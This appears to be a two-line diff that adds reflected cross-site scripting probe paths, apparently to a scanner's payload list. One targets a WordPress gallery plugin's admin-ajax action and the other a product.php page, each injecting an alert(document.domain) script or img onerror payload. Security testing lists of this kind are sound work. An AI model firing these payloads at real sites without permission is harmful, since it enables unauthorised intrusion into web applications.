@@ -1,0 +1,2 @@
+/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=<script>alert(document.domain)</script>
+/product.php?cid=1&&artname=%3Cimg%20src=1%20onerror=alert(document.domain)%3E
